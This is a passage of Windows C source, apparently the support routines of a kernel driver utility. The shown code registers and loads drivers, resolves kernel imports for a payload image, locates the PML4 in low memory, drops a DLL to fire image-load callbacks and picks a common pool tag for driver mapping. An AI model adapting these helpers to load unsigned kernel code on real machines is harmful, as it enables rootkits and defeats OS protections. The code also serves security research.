*
* Write DWORD value to the registry.
*
*/
NTSTATUS supRegWriteValueDWORD(
    _In_ HANDLE RegistryHandle,
    _In_ LPCWSTR ValueName,
    _In_ DWORD ValueData
)
{
    UNICODE_STRING valueName;

    RtlInitUnicodeString(&valueName, ValueName);
    return NtSetValueKey(RegistryHandle, &valueName, 0, REG_DWORD,
        (PVOID)&ValueData, sizeof(DWORD));
}

/*
* supRegWriteValueString
*
* Purpose:
*
* Write string value to the registry.
*
*/
NTSTATUS supRegWriteValueString(
    _In_ HANDLE RegistryHandle,
    _In_ LPCWSTR ValueName,
    _In_ LPCWSTR ValueData
)
{
    NTSTATUS status;
    UNICODE_STRING valueName;
    SIZE_T length;
    SIZE_T bytesNeeded;
    PWCHAR buffer;
    WCHAR smallBuf[64];

    if (ValueName == NULL || ValueData == NULL)
        return STATUS_INVALID_PARAMETER;

    RtlInitUnicodeString(&valueName, ValueName);

    length = _strlen(ValueData);
    if (length == 0) {
        smallBuf[0] = 0;
        return NtSetValueKey(RegistryHandle, &valueName, 0, REG_SZ,
            smallBuf, (ULONG)sizeof(UNICODE_NULL));
    }

    if (length >= 0xFFFFFFFF / sizeof(WCHAR))
        return STATUS_INVALID_PARAMETER;

    bytesNeeded = (length + 1) * sizeof(WCHAR);

    if (length < RTL_NUMBER_OF(smallBuf)) {
        buffer = smallBuf;
        _strncpy(buffer, RTL_NUMBER_OF(smallBuf), ValueData, RTL_NUMBER_OF(smallBuf));
    }
    else {
        buffer = (PWCHAR)supHeapAlloc(bytesNeeded);
        if (buffer == NULL)
            return STATUS_INSUFFICIENT_RESOURCES;
        _strncpy(buffer, bytesNeeded / sizeof(WCHAR), ValueData, bytesNeeded / sizeof(WCHAR));
    }

    status = NtSetValueKey(RegistryHandle,
        &valueName,
        0,
        REG_SZ,
        buffer,
        (ULONG)bytesNeeded);

    if (buffer != smallBuf)
        supHeapFree(buffer);

    return status;
}

/*
* supxCreateDriverEntry
*
* Purpose:
*
* Creating registry entry for driver.
*
*/
NTSTATUS supxCreateDriverEntry(
    _In_opt_ LPCWSTR DriverPath,
    _In_ LPCWSTR KeyName
)
{
    NTSTATUS status = STATUS_UNSUCCESSFUL;
    DWORD dwData, dwResult;
    HKEY keyHandle = NULL;
    UNICODE_STRING driverImagePath;

    RtlInitEmptyUnicodeString(&driverImagePath, NULL, 0);

    if (DriverPath) {
        if (!RtlDosPathNameToNtPathName_U(DriverPath,
            &driverImagePath,
            NULL,
            NULL))
        {
            return STATUS_INVALID_PARAMETER_2;
        }
    }

    if (ERROR_SUCCESS != RegCreateKeyEx(HKEY_LOCAL_MACHINE,
        KeyName,
        0,
        NULL,
        REG_OPTION_NON_VOLATILE,
        KEY_ALL_ACCESS,
        NULL,
        &keyHandle,
        NULL))
    {
        status = STATUS_ACCESS_DENIED;
        goto Cleanup;
    }

    dwResult = ERROR_SUCCESS;

    do {

        dwData = SERVICE_ERROR_NORMAL;
        dwResult = RegSetValueEx(keyHandle,
            TEXT("ErrorControl"),
            0,
            REG_DWORD,
            (BYTE*)&dwData,
            sizeof(dwData));
        if (dwResult != ERROR_SUCCESS)
            break;

        dwData = SERVICE_KERNEL_DRIVER;
        dwResult = RegSetValueEx(keyHandle,
            TEXT("Type"),
            0,
            REG_DWORD,
            (BYTE*)&dwData,
            sizeof(dwData));
        if (dwResult != ERROR_SUCCESS)
            break;

        dwData = SERVICE_DEMAND_START;
        dwResult = RegSetValueEx(keyHandle,
            TEXT("Start"),
            0,
            REG_DWORD,
            (BYTE*)&dwData,
            sizeof(dwData));

        if (dwResult != ERROR_SUCCESS)
            break;

        if (DriverPath) {
            dwResult = RegSetValueEx(keyHandle,
                TEXT("ImagePath"),
                0,
                REG_EXPAND_SZ,
                (BYTE*)driverImagePath.Buffer,
                (DWORD)driverImagePath.Length + sizeof(UNICODE_NULL));
        }

    } while (FALSE);

    RegCloseKey(keyHandle);

    if (dwResult != ERROR_SUCCESS) {
        status = STATUS_ACCESS_DENIED;
    }
    else
    {
        status = STATUS_SUCCESS;
    }

Cleanup:
    if (DriverPath) {
        if (driverImagePath.Buffer) {
            RtlFreeUnicodeString(&driverImagePath);
        }
    }
    return status;
}

/*
* supLoadDriverEx
*
* Purpose:
*
* Install driver and load it.
*
* N.B.
* SE_LOAD_DRIVER_PRIVILEGE is required to be assigned and enabled.
*
*/
NTSTATUS supLoadDriverEx(
    _In_ LPCWSTR DriverName,
    _In_ LPCWSTR DriverPath,
    _In_ BOOLEAN UnloadPreviousInstance,
    _In_opt_ pfnLoadDriverCallback Callback,
    _In_opt_ PVOID CallbackParam
)
{
    SIZE_T keyOffset;
    NTSTATUS status;
    UNICODE_STRING driverServiceName;

    WCHAR szBuffer[MAX_PATH + 1];

    if (DriverName == NULL)
        return STATUS_INVALID_PARAMETER_1;
    if (DriverPath == NULL)
        return STATUS_INVALID_PARAMETER_2;

    RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));

    keyOffset = RTL_NUMBER_OF(NT_REG_PREP);

    if (FAILED(StringCchPrintf(szBuffer, MAX_PATH,
        DRIVER_REGKEY,
        NT_REG_PREP,
        DriverName)))
    {
        return STATUS_INVALID_PARAMETER_1;
    }

    status = supxCreateDriverEntry(DriverPath,
        &szBuffer[keyOffset]);

    if (!NT_SUCCESS(status))
        return status;

    RtlInitUnicodeString(&driverServiceName, szBuffer);

    if (Callback) {
        status = Callback(&driverServiceName, CallbackParam);
        if (!NT_SUCCESS(status))
            return status;
    }

    status = NtLoadDriver(&driverServiceName);

    if (UnloadPreviousInstance) {
        if ((status == STATUS_IMAGE_ALREADY_LOADED) ||
            (status == STATUS_OBJECT_NAME_COLLISION) ||
            (status == STATUS_OBJECT_NAME_EXISTS))
        {
            status = NtUnloadDriver(&driverServiceName);
            if (NT_SUCCESS(status)) {
                status = NtLoadDriver(&driverServiceName);
            }
        }
    }
    else {
        if (status == STATUS_OBJECT_NAME_EXISTS)
            status = STATUS_SUCCESS;
    }

    return status;
}

/*
* supLoadDriver
*
* Purpose:
*
* Install driver and load it.
*
* N.B.
* SE_LOAD_DRIVER_PRIVILEGE is required to be assigned and enabled.
*
*/
NTSTATUS supLoadDriver(
    _In_ LPCWSTR DriverName,
    _In_ LPCWSTR DriverPath,
    _In_ BOOLEAN UnloadPreviousInstance
)
{
    return supLoadDriverEx(DriverName,
        DriverPath,
        UnloadPreviousInstance,
        NULL,
        NULL);
}

/*
* supUnloadDriver
*
* Purpose:
*
* Call driver unload and remove corresponding registry key.
*
* N.B.
* SE_LOAD_DRIVER_PRIVILEGE is required to be assigned and enabled.
*
*/
NTSTATUS supUnloadDriver(
    _In_ LPCWSTR DriverName,
    _In_ BOOLEAN fRemove
)
{
    NTSTATUS status;
    SIZE_T keyOffset;
    UNICODE_STRING driverServiceName;

    WCHAR szBuffer[MAX_PATH + 1];

    RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));

    if (FAILED(StringCchPrintf(szBuffer, MAX_PATH,
        DRIVER_REGKEY,
        NT_REG_PREP,
        DriverName)))
    {
        return STATUS_INVALID_PARAMETER_1;
    }

    keyOffset = RTL_NUMBER_OF(NT_REG_PREP);

    status = supxCreateDriverEntry(NULL,
        &szBuffer[keyOffset]);

    if (!NT_SUCCESS(status))
        return status;

    RtlInitUnicodeString(&driverServiceName, szBuffer);
    status = NtUnloadDriver(&driverServiceName);

    if (NT_SUCCESS(status)) {
        if (fRemove)
            supRegDeleteKeyTree(HKEY_LOCAL_MACHINE, &szBuffer[keyOffset]);
    }

    return status;
}

/*
* supOpenDriverEx
*
* Purpose:
*
* Open handle for driver.
*
*/
NTSTATUS supOpenDriverEx(
    _In_ LPCWSTR DriverName,
    _In_ ACCESS_MASK DesiredAccess,
    _Out_opt_ PHANDLE DeviceHandle
)
{
    HANDLE deviceHandle = NULL;
    UNICODE_STRING usDeviceLink;
    OBJECT_ATTRIBUTES obja;
    IO_STATUS_BLOCK iost;

    NTSTATUS ntStatus;

    RtlInitUnicodeString(&usDeviceLink, DriverName);
    InitializeObjectAttributes(&obja, &usDeviceLink, OBJ_CASE_INSENSITIVE, NULL, NULL);

    ntStatus = NtCreateFile(&deviceHandle,
        DesiredAccess,
        &obja,
        &iost,
        NULL,
        0,
        0,
        FILE_OPEN,
        FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,
        NULL,
        0);

    if (NT_SUCCESS(ntStatus)) {
        if (DeviceHandle)
            *DeviceHandle = deviceHandle;
    }

    return ntStatus;
}

/*
* supOpenDriver
*
* Purpose:
*
* Open handle for driver through \\DosDevices.
*
*/
NTSTATUS supOpenDriver(
    _In_ LPCWSTR DriverName,
    _In_ ACCESS_MASK DesiredAccess,
    _Out_ PHANDLE DeviceHandle
)
{
    NTSTATUS status = STATUS_UNSUCCESSFUL; 

    // assume failure
    if (DeviceHandle)
        *DeviceHandle = NULL;
    else
        return STATUS_INVALID_PARAMETER_2;

    if (DriverName) {

        WCHAR szDeviceLink[MAX_PATH + 1];

        RtlSecureZeroMemory(szDeviceLink, sizeof(szDeviceLink));

        if (FAILED(StringCchPrintf(szDeviceLink,
            MAX_PATH,
            TEXT("\\DosDevices\\%wS"),
            DriverName)))
        {
            return STATUS_INVALID_PARAMETER_1;
        }

        status = supOpenDriverEx(szDeviceLink,
            DesiredAccess,
            DeviceHandle);

        if (status == STATUS_OBJECT_NAME_NOT_FOUND ||
            status == STATUS_NO_SUCH_DEVICE) 
        {

            //
            // Check the case when no symlink available.
            //

            RtlSecureZeroMemory(szDeviceLink, sizeof(szDeviceLink));

            if (FAILED(StringCchPrintf(szDeviceLink,
                MAX_PATH,
                TEXT("\\Device\\%wS"),
                DriverName)))
            {
                return STATUS_INVALID_PARAMETER_1;
            }

            status = supOpenDriverEx(szDeviceLink,
                DesiredAccess,
                DeviceHandle);

        }

    }
    else {
        status = STATUS_INVALID_PARAMETER_1;
    }

    return status;
}

/*
* supGetSystemInfo
*
* Purpose:
*
* Wrapper for NtQuerySystemInformation.
*
*/
PVOID supGetSystemInfo(
    _In_ SYSTEM_INFORMATION_CLASS SystemInformationClass
)
{
    return ntsupGetSystemInfoEx(
        SystemInformationClass,
        NULL,
        (PNTSUPMEMALLOC)supHeapAlloc,
        (PNTSUPMEMFREE)supHeapFree);
}

/*
* supGetLoadedModulesList
*
* Purpose:
*
* Read list of loaded kernel modules.
*
*/
PVOID supGetLoadedModulesList(
    _In_ BOOL ExtendedOutput,
    _Out_opt_ PULONG ReturnLength
)
{
    return ntsupGetLoadedModulesListEx(ExtendedOutput,
        ReturnLength,
        (PNTSUPMEMALLOC)supHeapAlloc,
        (PNTSUPMEMFREE)supHeapFree);
}

/*
* supGetNtOsBase
*
* Purpose:
*
* Return ntoskrnl base address.
*
*/
ULONG_PTR supGetNtOsBase(
    VOID
)
{
    PRTL_PROCESS_MODULES   miSpace;
    ULONG_PTR              NtOsBase = 0;

    miSpace = (PRTL_PROCESS_MODULES)supGetLoadedModulesList(FALSE, NULL);
    if (miSpace) {
        NtOsBase = (ULONG_PTR)miSpace->Modules[0].ImageBase;
        supHeapFree(miSpace);
    }
    return NtOsBase;
}

/*
* supGetProcAddress
*
* Purpose:
*
* Get NtOskrnl procedure address.
*
*/
ULONG_PTR supGetProcAddress(
    _In_ ULONG_PTR KernelBase,
    _In_ ULONG_PTR KernelImage,
    _In_ LPCSTR FunctionName
)
{
    ANSI_STRING cStr;
    ULONG_PTR   pfn = 0;

    RtlInitString(&cStr, FunctionName);
    if (!NT_SUCCESS(LdrGetProcedureAddress((PVOID)KernelImage, &cStr, 0, (PVOID*)&pfn)))
        return 0;

    return KernelBase + (pfn - KernelImage);
}

/*
* supResolveKernelImport
*
* Purpose:
*
* Resolve import (ntoskrnl only).
*
*/
VOID supResolveKernelImport(
    _In_ ULONG_PTR Image,
    _In_ ULONG_PTR KernelImage,
    _In_ ULONG_PTR KernelBase
)
{
    PIMAGE_OPTIONAL_HEADER      popth;
    ULONG_PTR                   ITableVA, * nextthunk;
    PIMAGE_IMPORT_DESCRIPTOR    ITable;
    PIMAGE_THUNK_DATA           pthunk;
    PIMAGE_IMPORT_BY_NAME       pname;
    ULONG                       i;

    popth = &RtlImageNtHeader((PVOID)Image)->OptionalHeader;

    if (popth->NumberOfRvaAndSizes <= IMAGE_DIRECTORY_ENTRY_IMPORT)
        return;

    ITableVA = popth->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
    if (ITableVA == 0)
        return;

    ITable = (PIMAGE_IMPORT_DESCRIPTOR)(Image + ITableVA);

    if (ITable->OriginalFirstThunk == 0)
        pthunk = (PIMAGE_THUNK_DATA)(Image + ITable->FirstThunk);
    else
        pthunk = (PIMAGE_THUNK_DATA)(Image + ITable->OriginalFirstThunk);

    for (i = 0; pthunk->u1.Function != 0; i++, pthunk++) {
        nextthunk = (PULONG_PTR)(Image + ITable->FirstThunk);
        if ((pthunk->u1.Ordinal & IMAGE_ORDINAL_FLAG) == 0) {
            pname = (PIMAGE_IMPORT_BY_NAME)((PCHAR)Image + pthunk->u1.AddressOfData);
            nextthunk[i] = supGetProcAddress(KernelBase, KernelImage, pname->Name);
        }
        else
            nextthunk[i] = supGetProcAddress(KernelBase, KernelImage, (LPCSTR)(pthunk->u1.Ordinal & 0xffff));
    }
}

/*
* supQueryObjectFromHandle
*
* Purpose:
*
* Return object kernel address from handle in current process handle table.
*
*/
BOOL supQueryObjectFromHandle(
    _In_ HANDLE hOject,
    _Out_ ULONG_PTR* Address
)
{
    BOOL   bFound = FALSE;
    ULONG  i;
    DWORD  CurrentProcessId = GetCurrentProcessId();

    PSYSTEM_HANDLE_INFORMATION_EX pHandles;

    if (Address)
        *Address = 0;
    else
        return FALSE;

    pHandles = (PSYSTEM_HANDLE_INFORMATION_EX)supGetSystemInfo(SystemExtendedHandleInformation);
    if (pHandles) {
        for (i = 0; i < pHandles->NumberOfHandles; i++) {
            if (pHandles->Handles[i].UniqueProcessId == CurrentProcessId) {
                if (pHandles->Handles[i].HandleValue == (ULONG_PTR)hOject) {
                    *Address = (ULONG_PTR)pHandles->Handles[i].Object;
                    bFound = TRUE;
                    break;
                }
            }
        }
        supHeapFree(pHandles);
    }
    return bFound;
}

/*
* supGetCommandLineOption
*
* Purpose:
*
* Parse command line options.
*
*/
BOOL supGetCommandLineOption(
    _In_ LPCTSTR OptionName,
    _In_ BOOL IsParametric,
    _Inout_opt_ LPTSTR OptionValue,
    _In_ ULONG ValueSize,
    _Out_opt_ PULONG ParamLength
)
{
    BOOL    bResult;
    LPTSTR  cmdline = GetCommandLine();
    TCHAR   Param[MAX_PATH + 1];
    ULONG   rlen;
    int     i = 0;

    if (ParamLength)
        *ParamLength = 0;

    RtlSecureZeroMemory(Param, sizeof(Param));
    while (GetCommandLineParam(cmdline, i, Param, MAX_PATH, &rlen))
    {
        if (rlen == 0)
            break;

        if (_strcmp(Param, OptionName) == 0)
        {
            if (IsParametric) {
                bResult = GetCommandLineParam(cmdline, i + 1, OptionValue, ValueSize, &rlen);
                if (ParamLength)
                    *ParamLength = rlen;
                return bResult;
            }

            return TRUE;
        }
        ++i;
    }

    return FALSE;
}

/*
* supQueryMaximumUserModeAddress
*
* Purpose:
*
* Return maximum user mode address.
*
*/
ULONG_PTR supQueryMaximumUserModeAddress()
{
    NTSTATUS ntStatus;

    SYSTEM_BASIC_INFORMATION basicInfo;

    ULONG returnLength = 0;
    SYSTEM_INFO systemInfo;

    RtlSecureZeroMemory(&basicInfo, sizeof(basicInfo));

    ntStatus = NtQuerySystemInformation(SystemBasicInformation,
        &basicInfo,
        sizeof(basicInfo),
        &returnLength);

    if (NT_SUCCESS(ntStatus)) {
        return basicInfo.MaximumUserModeAddress;
    }
    else {

        RtlSecureZeroMemory(&systemInfo, sizeof(systemInfo));
        GetSystemInfo(&systemInfo);
        return (ULONG_PTR)systemInfo.lpMaximumApplicationAddress;
    }

}

/*
* supQuerySecureBootState
*
* Purpose:
*
* Query Firmware type and SecureBoot state if firmware is EFI.
*
*/
BOOLEAN supQuerySecureBootState(
    _Out_ PBOOLEAN pbSecureBoot
)
{
    BOOLEAN bResult = FALSE;
    BOOLEAN bSecureBoot = FALSE;

    if (pbSecureBoot)
        *pbSecureBoot = FALSE;

    if (NT_SUCCESS(supEnablePrivilege(SE_SYSTEM_ENVIRONMENT_PRIVILEGE, TRUE))) {

        bSecureBoot = FALSE;

        GetFirmwareEnvironmentVariable(
            L"SecureBoot",
            L"{8be4df61-93ca-11d2-aa0d-00e098032b8c}",
            &bSecureBoot,
            sizeof(BOOLEAN));

        supEnablePrivilege(SE_SYSTEM_ENVIRONMENT_PRIVILEGE, FALSE);

        if (pbSecureBoot) {
            *pbSecureBoot = bSecureBoot;
        }
        bResult = TRUE;
    }
    return bResult;
}

/*
* supGetFirmwareType
*
* Purpose:
*
* Return firmware type.
*
*/
NTSTATUS supGetFirmwareType(
    _Out_ PFIRMWARE_TYPE FirmwareType
)
{
    NTSTATUS ntStatus;
    ULONG returnLength = 0;
    SYSTEM_BOOT_ENVIRONMENT_INFORMATION sbei;

    *FirmwareType = FirmwareTypeUnknown;

    RtlSecureZeroMemory(&sbei, sizeof(sbei));

    ntStatus = NtQuerySystemInformation(SystemBootEnvironmentInformation,
        &sbei,
        sizeof(sbei),
        &returnLength);

    if (NT_SUCCESS(ntStatus)) {
        *FirmwareType = sbei.FirmwareType;

    }

    return ntStatus;
}

/*
* supReadFileToBuffer
*
* Purpose:
*
* Read file to buffer. Release memory when it no longer needed.
*
*/
PBYTE supReadFileToBuffer(
    _In_ LPWSTR lpFileName,
    _Inout_opt_ LPDWORD lpBufferSize
)
{
    NTSTATUS    status;
    HANDLE      hFile = NULL;
    PBYTE       Buffer = NULL;
    SIZE_T      sz = 0;

    UNICODE_STRING              usName;
    OBJECT_ATTRIBUTES           attr;
    IO_STATUS_BLOCK             iost;
    FILE_STANDARD_INFORMATION   fi;

    if (lpFileName == NULL)
        return NULL;

    usName.Buffer = NULL;

    do {

        if (!RtlDosPathNameToNtPathName_U(lpFileName, &usName, NULL, NULL))
            break;

        InitializeObjectAttributes(&attr, &usName, OBJ_CASE_INSENSITIVE, NULL, NULL);

        status = NtCreateFile(
            &hFile,
            FILE_READ_DATA | SYNCHRONIZE,
            &attr,
            &iost,
            NULL,
            FILE_ATTRIBUTE_NORMAL,
            FILE_SHARE_READ,
            FILE_OPEN,
            FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,
            NULL,
            0
        );

        if (!NT_SUCCESS(status)) {
            break;
        }

        RtlSecureZeroMemory(&fi, sizeof(fi));

        status = NtQueryInformationFile(
            hFile,
            &iost,
            &fi,
            sizeof(FILE_STANDARD_INFORMATION),
            FileStandardInformation);

        if (!NT_SUCCESS(status))
            break;

        sz = (SIZE_T)fi.EndOfFile.LowPart;

        Buffer = (PBYTE)supHeapAlloc(sz);
        if (Buffer) {

            status = NtReadFile(
                hFile,
                NULL,
                NULL,
                NULL,
                &iost,
                Buffer,
                fi.EndOfFile.LowPart,
                NULL,
                NULL);

            if (NT_SUCCESS(status)) {
                if (lpBufferSize)
                    *lpBufferSize = fi.EndOfFile.LowPart;
            }
            else {
                supHeapFree(Buffer);
                Buffer = NULL;
            }
        }

    } while (FALSE);

    if (hFile != NULL) {
        NtClose(hFile);
    }

    if (usName.Buffer)
        RtlFreeUnicodeString(&usName);

    return Buffer;
}

/*
* supGetPML4FromLowStub1M
*
* Purpose:
*
* Search for PML4 (CR3) entry in low stub.
*
* Taken from MemProcFs, https://github.com/ufrisk/MemProcFS/blob/master/vmm/vmmwininit.c#L414
*
*/
ULONG_PTR supGetPML4FromLowStub1M(
    _In_ ULONG_PTR pbLowStub1M)
{
    ULONG offset = 0;
    ULONG_PTR PML4 = 0;
    ULONG cr3_offset = FIELD_OFFSET(PROCESSOR_START_BLOCK, ProcessorState) +
        FIELD_OFFSET(KSPECIAL_REGISTERS, Cr3);

    SetLastError(ERROR_EXCEPTION_IN_SERVICE);

    __try {

        while (offset < 0x100000) {

            offset += 0x1000;

            if (0x00000001000600E9 != (0xffffffffffff00ff & *(UINT64*)(pbLowStub1M + offset))) //PROCESSOR_START_BLOCK->Jmp
                continue;

            if (0xfffff80000000000 != (0xfffff80000000003 & *(UINT64*)(pbLowStub1M + offset + FIELD_OFFSET(PROCESSOR_START_BLOCK, LmTarget))))
                continue;

            if (0xffffff0000000fff & *(UINT64*)(pbLowStub1M + offset + cr3_offset))
                continue;

            PML4 = *(UINT64*)(pbLowStub1M + offset + cr3_offset);
            break;
        }

    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        return 0;
    }

    SetLastError(ERROR_SUCCESS);

    return PML4;
}

/*
* supCreateSystemAdminAccessSD
*
* Purpose:
*
* Create security descriptor with Admin/System ACL set.
*
*/
NTSTATUS supCreateSystemAdminAccessSD(
    _Out_ PSECURITY_DESCRIPTOR * SecurityDescriptor,
    _Out_ PACL * DefaultAcl
)
{
    NTSTATUS ntStatus = STATUS_UNSUCCESSFUL;
    ULONG aclSize = 0;
    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
    PACL pAcl = NULL;
    PSECURITY_DESCRIPTOR securityDescriptor = NULL;

    UCHAR sidBuffer[2 * sizeof(SID)];

    *SecurityDescriptor = NULL;
    *DefaultAcl = NULL;

    do {

        RtlSecureZeroMemory(sidBuffer, sizeof(sidBuffer));

        securityDescriptor = (PSECURITY_DESCRIPTOR)supHeapAlloc(sizeof(SECURITY_DESCRIPTOR));
        if (securityDescriptor == NULL) {
            ntStatus = STATUS_INSUFFICIENT_RESOURCES;
            break;
        }

        aclSize += RtlLengthRequiredSid(1); //LocalSystem sid
        aclSize += RtlLengthRequiredSid(2); //Admin group sid
        aclSize += sizeof(ACL);
        aclSize += 2 * (sizeof(ACCESS_ALLOWED_ACE) - sizeof(ULONG));

        pAcl = (PACL)supHeapAlloc(aclSize);
        if (pAcl == NULL) {
            ntStatus = STATUS_INSUFFICIENT_RESOURCES;
            break;
        }

        ntStatus = RtlCreateAcl(pAcl, aclSize, ACL_REVISION);
        if (!NT_SUCCESS(ntStatus))
            break;

        //
        // Local System - Generic All.
        //
        RtlInitializeSid(sidBuffer, &ntAuthority, 1);
        *(RtlSubAuthoritySid(sidBuffer, 0)) = SECURITY_LOCAL_SYSTEM_RID;
        RtlAddAccessAllowedAce(pAcl, ACL_REVISION, GENERIC_ALL, (PSID)sidBuffer);

        //
        // Admins - Generic All.
        //
        RtlInitializeSid(sidBuffer, &ntAuthority, 2);
        *(RtlSubAuthoritySid(sidBuffer, 0)) = SECURITY_BUILTIN_DOMAIN_RID;
        *(RtlSubAuthoritySid(sidBuffer, 1)) = DOMAIN_ALIAS_RID_ADMINS;
        RtlAddAccessAllowedAce(pAcl, ACL_REVISION, GENERIC_ALL, (PSID)sidBuffer);

        ntStatus = RtlCreateSecurityDescriptor(securityDescriptor,
            SECURITY_DESCRIPTOR_REVISION1);
        if (!NT_SUCCESS(ntStatus))
            break;

        ntStatus = RtlSetDaclSecurityDescriptor(securityDescriptor,
            TRUE,
            pAcl,
            FALSE);

        if (!NT_SUCCESS(ntStatus))
            break;

        *SecurityDescriptor = securityDescriptor;
        *DefaultAcl = pAcl;

    } while (FALSE);

    if (!NT_SUCCESS(ntStatus)) {

        if (pAcl) supHeapFree(pAcl);

        if (securityDescriptor) {
            supHeapFree(securityDescriptor);
        }

        *SecurityDescriptor = NULL;
        *DefaultAcl = NULL;
    }

    return ntStatus;
}

/*
* supGetTimeAsSecondsSince1970
*
* Purpose:
*
* Return seconds since 1970.
*
*/
ULONG supGetTimeAsSecondsSince1970()
{
    LARGE_INTEGER fileTime;
    ULONG seconds = 0;

    GetSystemTimeAsFileTime((PFILETIME)&fileTime);
    RtlTimeToSecondsSince1970(&fileTime, &seconds);
    return seconds;
}

/*
* supGetModuleBaseByName
*
* Purpose:
*
* Return module base address.
*
*/
ULONG_PTR supGetModuleBaseByName(
    _In_ LPCWSTR ModuleName,
    _Out_opt_ PULONG ImageSize
)
{
    ULONG_PTR ReturnAddress = 0;
    ULONG i, k;
    PRTL_PROCESS_MODULES miSpace;

    ANSI_STRING moduleName;

    if (ImageSize)
        *ImageSize = 0;

    moduleName.Buffer = NULL;
    moduleName.Length = moduleName.MaximumLength = 0;

    if (!NT_SUCCESS(supConvertToAnsi(ModuleName, &moduleName)))
        return 0;

    miSpace = (PRTL_PROCESS_MODULES)supGetLoadedModulesList(FALSE, NULL);
    if (miSpace != NULL) {

        for (i = 0; i < miSpace->NumberOfModules; i++) {

            k = miSpace->Modules[i].OffsetToFileName;
            if (_strcmpi_a(
                (CONST CHAR*) & miSpace->Modules[i].FullPathName[k],
                moduleName.Buffer) == 0)
            {
                ReturnAddress = (ULONG_PTR)miSpace->Modules[i].ImageBase;
                if (ImageSize)
                    *ImageSize = miSpace->Modules[i].ImageSize;
                break;
            }

        }

        supHeapFree(miSpace);

    }

    RtlFreeAnsiString(&moduleName);

    return ReturnAddress;
}

/*
* supManageDummyDll
*
* Purpose:
*
* Drop dummy dll to the %temp% and load it to trigger ImageLoad notify callbacks.
* If fRemove set to TRUE then remove previously dropped file and return result of operation.
*
*/
BOOL supManageDummyDll(
    _In_ LPCWSTR lpDllName,
    _In_ BOOLEAN fRemove
)
{
    BOOL bResult = FALSE;
    ULONG dataSize = 0;
    PBYTE dataBuffer;
    PVOID dllHandle;

    LPWSTR lpFileName;
    SIZE_T Length = (1024 + _strlen(lpDllName)) * sizeof(WCHAR);

    //
    // Allocate space for filename.
    //
    lpFileName = (LPWSTR)supHeapAlloc(Length);
    if (lpFileName == NULL) {
        SetLastError(ERROR_NOT_ENOUGH_MEMORY);
        return FALSE;
    }

    if (fRemove) {

        HMODULE hModule = GetModuleHandle(lpDllName);

        if (hModule) {

            if (GetModuleFileName(hModule, lpFileName, MAX_PATH)) {
                FreeLibrary(hModule);
                bResult = DeleteFile(lpFileName);
            }

        }

    }
    else {

        DWORD cch = supExpandEnvironmentStrings(L"%temp%\\", lpFileName, MAX_PATH);
        if (cch == 0 || cch > MAX_PATH) {
            SetLastError(ERROR_NOT_ENOUGH_MEMORY);
        }
        else {

            //
            // Extract file from resource and drop to the disk in %temp% directory.
            //
            dllHandle = (PVOID)GetModuleHandle(NULL);

            dataBuffer = (PBYTE)KDULoadResource(IDR_TAIGEI64,
                dllHandle,
                &dataSize,
                PROVIDER_RES_KEY,
                TRUE);

            if (dataBuffer) {

                _strcat(lpFileName, lpDllName);
                if (dataSize == supWriteBufferToFile(lpFileName,
                    dataBuffer,
                    dataSize,
                    TRUE,
                    FALSE,
                    NULL))
                {
                    //
                    // Finally load file and trigger image notify callbacks.
                    //
                    if (LoadLibraryEx(lpFileName, NULL, 0))
                        bResult = TRUE;
                }

                supHeapFree(dataBuffer);
            }
            else {
                SetLastError(ERROR_FILE_INVALID);
            }

        }
    }

    supHeapFree(lpFileName);

    return bResult;
}

/*
* supSelectNonPagedPoolTag
*
* Purpose:
*
* Query most used nonpaged pool tag.
*
*/
ULONG supSelectNonPagedPoolTag(
    VOID
)
{
    ULONG ulResult = SHELL_POOL_TAG;
    PSYSTEM_POOLTAG_INFORMATION pvPoolInfo;

    pvPoolInfo = (PSYSTEM_POOLTAG_INFORMATION)supGetSystemInfo(SystemPoolTagInformation);
    if (pvPoolInfo) {

        SIZE_T maxUse = 0;

        for (ULONG i = 0; i < pvPoolInfo->Count; i++) {

            if (pvPoolInfo->TagInfo[i].NonPagedUsed > maxUse) {
                maxUse = pvPoolInfo->TagInfo[i].NonPagedUsed;
                ulResult = pvPoolInfo->TagInfo[i].TagUlong;
            }

        }

        supHeapFree(pvPoolInfo);
    }

    return ulResult;
}

/*
* supLoadFileForMapping
*
* Purpose:
*
* Load input file for further driver mapping.
*
*/
NTSTATUS supLoadFileForMapping(
    _In_ LPCWSTR PayloadFileName,
    _Out_ PVOID * LoadBase
)
{
    NTSTATUS ntStatus;
    ULONG dllCharacteristics = IMAGE_FILE_EXECUTABLE_IMAGE;
    UNICODE_STRING usFileName;

    PVOID pvImage = NULL;
    PIMAGE_NT_HEADERS pNtHeaders;

    *LoadBase = NULL;

    //
    // Map input file as image.
    //
    RtlInitUnicodeString(&usFileName, PayloadFileName);
    ntStatus = LdrLoadDll(NULL, &dllCharacteristics, &usFileName, &pvImage);
    if ((!NT_SUCCESS(ntStatus)) || (pvImage == NULL)) {
        return ntStatus;
    }

    pNtHeaders = RtlImageNtHeader(pvImage);
    if (pNtHeaders == NULL) {
        return STATUS_INVALID_IMAGE_FORMAT;
    }

    *LoadBase = pvImage;

    return STATUS_SUCCESS;
}

/*
* supPrintfEvent
*
* Purpose:
*
* Wrapper for printf_s for displaying specific events.
*
*/
VOID supPrintfEvent(
    _In_ KDU_EVENT_TYPE Event,
    _Printf_format_string_ LPCSTR Format,
    ...
)
{
    HANDLE stdHandle = GetStdHandle(STD_OUTPUT_HANDLE);
    CONSOLE_SCREEN_BUFFER_INFO screenBufferInfo;
    WORD origColor = FOREGROUND_BLUE | FOREGROUND_RED | FOREGROUND_GREEN, newColor;
    va_list args;

    //
    // Rememeber original text color.
    //
    if (GetConsoleScreenBufferInfo(stdHandle, &screenBufferInfo)) {
        origColor = *(&screenBufferInfo.wAttributes);
    }

    switch (Event) {
    case kduEventInformation:
        newColor = FOREGROUND_GREEN | FOREGROUND_INTENSITY;
        break;
    case kduEventError:
        newColor = FOREGROUND_RED | FOREGROUND_INTENSITY;
        break;
    default:
        newColor = FOREGROUND_BLUE | FOREGROUND_RED | FOREGROUND_GREEN;
        break;
    }

    SetConsoleTextAttribute(stdHandle, newColor);

    //
    // Printf message.
    //
    va_start(args, Format);
    vprintf_s(Format, args);
